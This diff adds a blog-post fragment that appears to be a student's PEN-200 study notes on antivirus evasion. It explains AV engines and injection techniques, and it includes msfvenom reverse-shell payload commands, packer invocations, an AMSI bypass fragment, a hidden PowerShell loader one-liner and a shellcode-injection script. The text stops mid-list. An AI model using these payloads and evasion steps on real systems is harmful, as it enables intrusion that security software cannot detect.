@@ -1,0 +1,639 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">av-evasion.html</h4>
+        <div class="git-file-meta">
+          <span>33 KB</span>
+          <span>site-output/blog/fragments/av-evasion.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>
+
+
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;av-evasion&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;PEN-200 Module 14 — Antivirus Evasion in 2023&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Sep 18, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;30 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;EV signatures change weekly, so the lab notebook emphasises process over recipes. Here’s the enriched workflow that survived testing.&lt;/p&gt;
+&lt;h3&gt;Profile the Target Engine&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Collect product/version (&lt;code&gt;Get-MpComputerStatus&lt;/code&gt;, &lt;code&gt;wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Identify telemetry: does it ship logs to Defender for Endpoint, Carbon Black, CrowdStrike? Note event IDs and storage paths.&lt;/li&gt;
+&lt;li&gt;Understand scanning modes (on-access, scheduled, cloud lookups) and file reputation rules.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;On-Disk Obfuscation&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Generate baseline payload: &lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Repackage with custom loaders:&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Donut&lt;/code&gt; ➜ shellcode wrapper.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ScareCrow&lt;/code&gt; ➜ AMSI-aware loader with randomised imports.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pezor&lt;/code&gt; ➜ PE packer with API hashing.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.1 LPORT=4443 -f raw &amp;gt; payload.bin
+./donut -f payload.bin -o payload.js
+./scarecrow -i payload.bin -domain corp.local -out beacon.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;Modify PE metadata (timestamps, section names) using &lt;code&gt;pefile&lt;/code&gt; or &lt;code&gt;sigcheck -q -m&lt;/code&gt; to verify changes.&lt;/li&gt;
+&lt;li&gt;Sign payloads with client-provided certs when available; log thumbprints.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;In-Memory &amp;amp; LOLBAS Techniques&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Use &lt;code&gt;VirtualAlloc&lt;/code&gt; ➜ &lt;code&gt;RtlMoveMemory&lt;/code&gt; ➜ &lt;code&gt;CreateThread&lt;/code&gt; flow for reflective loaders; keep the loader &amp;lt;3 KB to dodge heuristics.&lt;/li&gt;
+&lt;li&gt;Leverage AMSI bypasses responsibly (&lt;code&gt;[Ref].Assembly.GetType(&amp;quot;System.Management.Automation.AmsiUtils&amp;quot;)&lt;/code&gt;…); rotate strings and obfuscation each run.&lt;/li&gt;
+&lt;li&gt;Abuse LOLBAS binaries (&lt;code&gt;installutil.exe&lt;/code&gt;, &lt;code&gt;msbuild.exe&lt;/code&gt;, &lt;code&gt;rundll32.exe&lt;/code&gt;) to execute payloads without touching disk.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;powershell -nop -w hidden -c &amp;quot;[System.Reflection.Assembly]::Load([Convert]::FromBase64String(&amp;#39;&amp;lt;base64 loader&amp;gt;&amp;#39;)); Invoke-EntryPoint&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Testing Matrix&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Validate in isolated VMs for each AV product; capture detection verdicts (blocked, quarantined, allowed) and log them.&lt;/li&gt;
+&lt;li&gt;Record hash values (MD5/SHA256), VT hits, and behavioural detections for the report.&lt;/li&gt;
+&lt;li&gt;Keep a spreadsheet of loader versions, obfuscation options, and success rates.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Defensive Recommendations&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Encourage clients to enable cloud-delivered protection, script block logging, and AMSI integrations.&lt;/li&gt;
+&lt;li&gt;Suggest application control (AppLocker/WDAC), PowerShell Constrained Language Mode, and EDR monitoring for LOLBAS anomalies.&lt;/li&gt;
+&lt;li&gt;Share IOC samples (filenames, hashes, mutexes, network indicators) generated during testing.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;AV evasion is an engineering treadmill. Capture every knob you turn, test across engines, and pair offensive success with actionable defensive guidance.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h3&gt;Antivirus Evasion&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Antivirus Software Key Components and Operations.&lt;/li&gt;
+&lt;li&gt;Bypassing Antivirus Detections.&lt;/li&gt;
+&lt;li&gt;Antivirus Evasion in Practice.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;14.1 Antivirus Software Key Components and Operations&lt;/h4&gt;
+&lt;p&gt;- &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Recognize known vs unknown threats.&lt;/li&gt;
+&lt;li&gt;Understand AV key components.&lt;/li&gt;
+&lt;li&gt;Understand AV detection engines.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Known vs Unknown Threats&lt;/h5&gt;
+&lt;p&gt;Originally AV was based on signatures.  Signature languages are unique to each AV engine.  The signature languages vary, on one engine the signature may analyze the malware&amp;#39;s signature on disk where another may analyze it&amp;#39;s network traffic.&lt;/p&gt;
+&lt;p&gt;In 2014 a sig language called YARA was open-sourced, allowing researchers to query the VirusTotal platform, even integrating their own signatures into AV products.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VirusTotal is an AV search engine.&lt;/li&gt;
+&lt;li&gt;Search known malware.&lt;/li&gt;
+&lt;li&gt;Submit samples and test against known.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Signatures are written based on known threats, initially AV could only detect malware that had already been documented.  Modern AV, including Win Defender, integrate a Machine Learning engine that is called whenever an unknown file is discovered on the system.  ML Engines, operate in the cloud, and require an internet connection, which is often not an option on internal enterprise servers.  AV engines should not borrow too much resource from the system.&lt;/p&gt;
+&lt;p&gt;To overcome the limits, Endpoint Detection and Response (EDR) have been evolving.  The EDR generates security event telemetry and forwards it to the SIEM.  The SIEM is monitored by teams of analysts, giving them a full overview of the org, any past or ongoing attack.&lt;/p&gt;
+&lt;p&gt;AV and EDR are not mutually exclusive, they compliment each other.  Their deployment is based on internal network arch.&lt;/p&gt;
+&lt;h5&gt;AV Engines and Components&lt;/h5&gt;
+&lt;p&gt;Modern AV relies on signature updates, retrieved from the vendor&amp;#39;s DB, over the internet.  The signatures are stored in a local sig DB, where they are utilized by the engine components;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;File Engine.&lt;/li&gt;
+&lt;li&gt;Responsible for scheduled and real-time file scans.&lt;/li&gt;
+&lt;li&gt;Scheduled scan.&lt;/li&gt;
+&lt;li&gt;Parses the entire file system, sending each files metadata to the sig engine.&lt;/li&gt;
+&lt;li&gt;Real-time.&lt;/li&gt;
+&lt;li&gt;Detecting and possibly reacting to any new file action, i.e. downloading malware from a website.&lt;/li&gt;
+&lt;li&gt;IDs events a the kernel level via special mini-filter driver.
+- This is why modern AV operates in Kernel and User land to validate the entire OS scope.&lt;/li&gt;
+&lt;li&gt;Memory Engine.&lt;/li&gt;
+&lt;li&gt;Inspects each processes mem space at runtime for well-known binary sigs and suspicious API call that may result in mem injection attacks.&lt;/li&gt;
+&lt;li&gt;Network Engine.&lt;/li&gt;
+&lt;li&gt;Inspects incoming and outgoing network traffic on the local net iface.&lt;/li&gt;
+&lt;li&gt;When a sig is matched, the net eng may attempt to block malware from comm with it&amp;#39;s C2 server.&lt;/li&gt;
+&lt;li&gt;Disassembler.&lt;/li&gt;
+&lt;li&gt;Translates machine code into asm.&lt;/li&gt;
+&lt;li&gt;Reconstructing the original code section.&lt;/li&gt;
+&lt;li&gt;IDs encode/decode routines.&lt;/li&gt;
+&lt;li&gt;Emulator/Sandbox.&lt;/li&gt;
+&lt;li&gt;Isolate and load malware for analysis.&lt;/li&gt;
+&lt;li&gt;Once loaded and running in the emulated sandbox it is thoroughly analyzed against known sigs.&lt;/li&gt;
+&lt;li&gt;Browser Plugin.&lt;/li&gt;
+&lt;li&gt;Browsers are protected by a sandbox, modern AV uses browser plugins to get visibility and detect mal content exec in browser.&lt;/li&gt;
+&lt;li&gt;Machine Learning Engine.&lt;/li&gt;
+&lt;li&gt;Vital part of modern AV, enables the detection of unknown threats by relying on cloud enhanced computing resources.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These engines work in concert with the sig DB to rank events as benign, malicious, or unknown.&lt;/p&gt;
+&lt;h5&gt;Detection Methods&lt;/h5&gt;
+&lt;p&gt;AV sig syntax and scope differs based on the engine they are built for, but serve the same purpose.  Detection methodologies;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Signature-based Detection.&lt;/li&gt;
+&lt;li&gt;Restricted list technology.&lt;/li&gt;
+&lt;li&gt;Scans for known sigs.&lt;/li&gt;
+&lt;li&gt;Sigs can be a file hash, set of patterns, specific binary vals and strings belonging to each specific malware.&lt;/li&gt;
+&lt;li&gt;Weak method, changing a single bit results in a completely diff hash.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Heuristic_analysis&quot;&gt;Heuristic-based Detection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Relies on rules and algorithms to make determination.&lt;/li&gt;
+&lt;li&gt;Steps through instruction set of binary file or decompile/analyze the source code to map the program.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf&quot;&gt;Behavioral Detection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Dynamically analyzes the the behavior of a binary file .&lt;/li&gt;
+&lt;li&gt;Achieved by exec in sandbox and searching for behavior considered malicious.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf&quot;&gt;Machine Learning Detection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Uses ML algorithms to detect unknown threats.&lt;/li&gt;
+&lt;li&gt;Collects and analyzes metadata.&lt;/li&gt;
+&lt;li&gt;Example; Win Defender has 2 ML components.&lt;/li&gt;
+&lt;li&gt;Client ML engine.&lt;/li&gt;
+&lt;li&gt;Creates ML models and heuristics.&lt;/li&gt;
+&lt;li&gt;Cloud ML engine.&lt;/li&gt;
+&lt;li&gt;Analyze submitted samples against cloud DB of metadata based models of other submitted samples.&lt;/li&gt;
+&lt;li&gt;When client ML is unable to determine benign or not, it passes it to the cloud ML for final response.&lt;/li&gt;
+&lt;li&gt;Doesn&amp;#39;t require sigs and can detect unknown threats.&lt;/li&gt;
+&lt;li&gt;Methods differ by AV vendor and results differ as well.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To demonstrate this, we will scan a Metasploit payload.  Using Msfvenom we will generate a standard Win PE containing our payload, a simple TCP rev shell.
+&lt;em&gt;The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the Windows Loader7 to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Before generating a payload, make sure Kali and MSF are up to date.  MSF is updated frequently and AV sigs change as well.  The intrinsic delay in AV sign updates may give a fresh version of MSF an edge against stale AV sigs during a pentest.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate the payload.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;msfvenom&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; to specify the payload.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LHOST&lt;/code&gt; rev shell local host.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LPORT&lt;/code&gt; rev shell local port.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; specifying &lt;code&gt;EXE&lt;/code&gt; file format.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; output a file names &lt;code&gt;binary.exe&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/fixing-exploits]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f exe &amp;gt; binary.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Scan the exe using VirusTotal.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.&lt;/em&gt;.
+&lt;img src=&quot;assets/static/resources/d2c73438e913b954933365e758704e5f.png&quot; alt=&quot;d2c73438e913b954933365e758704e5f.png&quot;&gt;&lt;/li&gt;
+&lt;li&gt;Many AV products flag the file as malicious based on various methods descibed here.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;14.1 Bypassing Antivirus Detections&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand on-disk evasion techniques.&lt;/li&gt;
+&lt;li&gt;Understand in-memory evasion techniques.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;On-Disk Evasion&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Modern malware obfuscation takes many forms.&lt;/li&gt;
+&lt;li&gt;One of the earliest methods is the use of &lt;a href=&quot;https://en.wikipedia.org/wiki/Executable_compression&quot;&gt;packers&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Designed to reduce size of executable.&lt;/li&gt;
+&lt;li&gt;Generate an exe that is smaller, functionally equivalent, with a new binary structure.&lt;/li&gt;
+&lt;li&gt;Has a new hash sig and can bypass older AV methods based on file sig.&lt;/li&gt;
+&lt;li&gt;Modern malware uses variations, &lt;a href=&quot;https://upx.github.io/&quot;&gt;UPX&lt;/a&gt; and other packers alone are not enough to evade modern AV.&lt;/li&gt;
+&lt;li&gt;Obfuscators.&lt;/li&gt;
+&lt;li&gt;Mutate code making it harder to reverse-engineer.&lt;/li&gt;
+&lt;li&gt;Replaces instructions with semantic equiv.&lt;/li&gt;
+&lt;li&gt;Insert &lt;a href=&quot;https://en.wikipedia.org/wiki/Dead_code&quot;&gt;dead code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Split/reorder funcs.&lt;/li&gt;
+&lt;li&gt;Primarily used by software developers to protect their IP.&lt;/li&gt;
+&lt;li&gt;Marginally effective against sig based AV methods.&lt;/li&gt;
+&lt;li&gt;Modern obfuscators have runtime in-mem capabilities, hinder AV detection further.&lt;/li&gt;
+&lt;li&gt;Crypter.&lt;/li&gt;
+&lt;li&gt;Cryptographically alters exe.&lt;/li&gt;
+&lt;li&gt;Adds decrypt stub that restore OG code on exec.&lt;/li&gt;
+&lt;li&gt;Decrypt happends in mem, leaving encrypted code on disk.&lt;/li&gt;
+&lt;li&gt;Foundational in modern malware as one of the most effective evasion techniques.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Effective evasion requires a combination of techniques and more advanced methods;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Anti-reversing.&lt;/li&gt;
+&lt;li&gt;Anti-debugging.&lt;/li&gt;
+&lt;li&gt;VM emulation detection.&lt;/li&gt;
+&lt;li&gt;Software protectors.&lt;/li&gt;
+&lt;li&gt;Designed for legit purposes, but can be used to bypass AV.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There are several actively-maintained free tools that provide adequate AV evasion.  Commercial tools, such as &lt;a href=&quot;http://www.enigmaprotector.com/en/home.html&quot;&gt;The Enigma Protector&lt;/a&gt;, can bypass many AV products.&lt;/p&gt;
+&lt;h5&gt;In-Memory Evasion&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process&quot;&gt;In-Memory Injections&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Aka PE Injection.&lt;/li&gt;
+&lt;li&gt;Popular technique for bypassing AV on Win.&lt;/li&gt;
+&lt;li&gt;Focuses on manipulation of volatile mem.&lt;/li&gt;
+&lt;li&gt;Does not write to disk.&lt;/li&gt;
+&lt;li&gt;Common focus of most AV solutions.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://blog.f-secure.com/memory-injection-like-a-boss/&quot;&gt;Several evasion techniques&lt;/a&gt; do not write to disk.&lt;/li&gt;
+&lt;li&gt;Remote Process Memory Injection.&lt;/li&gt;
+&lt;li&gt;Injects payload into a benign PE.&lt;/li&gt;
+&lt;li&gt;Common method leverages &lt;a href=&quot;https://en.wikipedia.org/wiki/Windows_API&quot;&gt;Win APIs&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;To achieve;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Obtain valid &lt;a href=&quot;https://en.wikipedia.org/wiki/Handle_(computing)&quot;&gt;HANDLE&lt;/a&gt; of target process.&lt;ul&gt;
+&lt;li&gt;Allocate mem in the context of that process by calling WIN API such as;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&quot;&gt;VirtualAllocEx&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Copy payload into alloc mem.
+    - &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Exec in mem.
+    - &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;CreateRemoteThread&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Though complex, Powershell can do the heavy lifting in most cases.&lt;/li&gt;
+&lt;li&gt;Reflective DLL Injection.&lt;/li&gt;
+&lt;li&gt;Unlike regular DLL injection, where the DLL is loaded from disk using the LoadLibrary API, this method attempts to load a DLL stored by the attacker in process memory.&lt;/li&gt;
+&lt;li&gt;Challenge being LoadLibrary does not support loading a DLL from memory.&lt;/li&gt;
+&lt;li&gt;Win also does not expose and API that can handle this.&lt;/li&gt;
+&lt;li&gt;Attacker must write their own version of the API that does not require disk based DLL loading.&lt;/li&gt;
+&lt;li&gt;Process Hollowing.&lt;/li&gt;
+&lt;li&gt;FIrst launch a benign process in a suspended state.&lt;/li&gt;
+&lt;li&gt;Once launched, the image of the proc is removed from mem and replaced with mal exec image.&lt;/li&gt;
+&lt;li&gt;Finally, process is resumed and mal code is executed in place of legit proc.&lt;/li&gt;
+&lt;li&gt;Inline Hooking.&lt;/li&gt;
+&lt;li&gt;Modify memory to introduce a hook (instruction redirecting code for exec)&lt;/li&gt;
+&lt;li&gt;Upon redirection and exec of mal code the the flow returns back to the modified func appearing as only the legit code had executed.&lt;/li&gt;
+&lt;li&gt;Often employed by rootkits.&lt;/li&gt;
+&lt;li&gt;Stealthy malware, provide author with persistent dedicated access to the target system.&lt;/li&gt;
+&lt;li&gt;Modifies system components in;&lt;/li&gt;
+&lt;li&gt;User space.&lt;/li&gt;
+&lt;li&gt;Kernel.&lt;/li&gt;
+&lt;li&gt;Lower OS protection rings.
+- Boot.
+- Hypervisor.&lt;/li&gt;
+&lt;li&gt;Need admin privs.&lt;/li&gt;
+&lt;li&gt;Often installed from an elevated shell or by privesc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;14.3 AV Evasion in Practice&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand antivirus evasion testing best practices.&lt;/li&gt;
+&lt;li&gt;Manually evade AV solutions.&lt;/li&gt;
+&lt;li&gt;Leverage automated tools for AV evasion.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Testing for AV Evasion&lt;/h5&gt;
+&lt;p&gt;SecOps; joint collab between enterprise IT and SOC, goal is to provide continuous detection/protection against well-known and novel threats.  As a pentester you have to have an understanding of the implications dealing with SecOps teams.&lt;/p&gt;
+&lt;p&gt;Example;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VirusTotal can give us an idea of how stealthy our malware is.&lt;/li&gt;
+&lt;li&gt;The platform sends all samples to AV vendors subscribed to their platform.&lt;/li&gt;
+&lt;li&gt;Therefore shortly after submitting a sample, AV vendors can run the mal in their sandbox and ML engines to build detection sigs.&lt;/li&gt;
+&lt;li&gt;Rendering the mal unusable.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://antiscan.me/&quot;&gt;AntiScan.Me&lt;/a&gt; scans against 30 diff AV engines and claims to not divulge samples to 3rd parties.&lt;/li&gt;
+&lt;li&gt;This is a last resort when we don&amp;#39;t know the target&amp;#39;s AV vendor.&lt;/li&gt;
+&lt;li&gt;If we know the target&amp;#39;s AV vendor.&lt;/li&gt;
+&lt;li&gt;We should build a VM similar to the target env.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Regardless of AV product we are testing, we should disable sample submission to prevent the same drawback as virus total.  In Win Defender;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows Security.&lt;/li&gt;
+&lt;li&gt;Virus &amp;amp; Thread Protection.&lt;/li&gt;
+&lt;li&gt;Manage Settings.&lt;/li&gt;
+&lt;li&gt;Deselect automatic sample submission.&lt;/li&gt;
+&lt;li&gt;Only enable it when we are confident in our bypass method and if the target has it enabled in their env.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Since both Windows Defender cloud protection and automatic sample submission require internet connectivity, we should first verify that this is reflected in our target environment: some company policies mandate limited internet access to some production servers and as a consequence, some advanced AV features are inhibited.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As a rule of thumb, always prefer custom code when developing bypasses.  AV signatures are extrapolated from the malware sample, the more novel the code, the lower the likelihood of detection.&lt;/p&gt;
+&lt;h5&gt;Evading AV with Thread Injection&lt;/h5&gt;
+&lt;p&gt;Finding a universal solution to bypass all AV engine is difficult, time consuming, and possibly impossible.  It is far more effective to target the specific AV solution deployed by the target.&lt;/p&gt;
+&lt;p&gt;In our examples, we will interact with &lt;em&gt;Avira Free Security version 1.1.68.29553&lt;/em&gt; on a Win 11 client.  As a first step in working with AV, make sure the system is working as intended by testing it with the basic Msfvenom PE we created earlier.  &lt;/p&gt;
+&lt;p&gt;Depending on how restricted the target env is, we may be able to bypass the AV product with PowerShell.  This example will utilize the &lt;strong&gt;remote process memory injection&lt;/strong&gt; technique, similar to what we described previously, but we will target the currently executing process (x86 PowerShell interpreter).&lt;/p&gt;
+&lt;p&gt;PowerShell can interact with the &lt;a href=&quot;https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/&quot;&gt;Windows API&lt;/a&gt;, allowing us to implement in-memory injection using a PowerShell script.  It&amp;#39;s harder for AV to determine if a script is malicious compared to a PE, the script itself is not exec code and runs in the interpreter.  AV solutions handle mal script detection with varying degrees of success.&lt;/p&gt;
+&lt;p&gt;In the event the script is marked as mal, it can be easily altered.  AV will often review the variable names, comments, and logic which can be altered without the need to recompile.&lt;/p&gt;
+&lt;p&gt;To demonstrate, we will analyze a well-known version of a memory injection PowerShell script and test it against it with Avira.  The basic template for memory injection;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$code = &amp;#39;
+[DllImport(&amp;quot;kernel32.dll&amp;quot;)]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport(&amp;quot;kernel32.dll&amp;quot;)]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport(&amp;quot;msvcrt.dll&amp;quot;)]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);&amp;#39;;
+
+$winFunc = 
+  Add-Type -memberDefinition $code -Name &amp;quot;Win32&amp;quot; -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]]$sc = &amp;lt;place your shellcode here&amp;gt;;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The scripts starts with imports.&lt;/li&gt;
+&lt;li&gt;VirtualAlloc.&lt;/li&gt;
+&lt;li&gt;From  &lt;code&gt;kernel32.dll&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Allocate memory.&lt;/li&gt;
+&lt;li&gt;CreateThread.&lt;/li&gt;
+&lt;li&gt;From  &lt;code&gt;kernel32.dll&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Create an execution thread.&lt;/li&gt;
+&lt;li&gt;Memset.&lt;/li&gt;
+&lt;li&gt;From  &lt;code&gt;msvcrt.dll&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Write data to allocated memory.&lt;/li&gt;
+&lt;li&gt;This is performed in the current process, powershell.exe.&lt;/li&gt;
+&lt;li&gt;The main logic.&lt;/li&gt;
+&lt;li&gt;Allocates a block of mem.&lt;/li&gt;
+&lt;li&gt;Takes each byte of &lt;code&gt;$sc&lt;/code&gt; byte array, writes it to newly-allocated mem using &lt;code&gt;memset&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;It then executes in a separate thread.&lt;/li&gt;
+&lt;li&gt;Uses the &lt;code&gt;CreateThread&lt;/code&gt; API.&lt;/li&gt;
+&lt;li&gt;We have to add a payload and will use the same one as the PE for consistency.&lt;/li&gt;
+&lt;li&gt;Generate with msfvenom.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+...
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 699 bytes
+Final size of powershell file: 3454 bytes
+[Byte[]] $sc =  0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Copy the output into the script.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Next we validate the detection rate of the PS1 script.  AntiScan.me is the first choice, but does not support PS1, se we must use VirusTotal.
+&lt;img src=&quot;assets/static/resources/1e0e231418742146669ea4729a1b7a39.png&quot; alt=&quot;1e0e231418742146669ea4729a1b7a39.png&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;29/59, not great!&lt;/li&gt;
+&lt;li&gt;We need to circumvent some of the AV sig logic.&lt;/li&gt;
+&lt;li&gt;Scripts are just interpreted text files.&lt;/li&gt;
+&lt;li&gt;Not as easily fingerprinted as binary files.&lt;/li&gt;
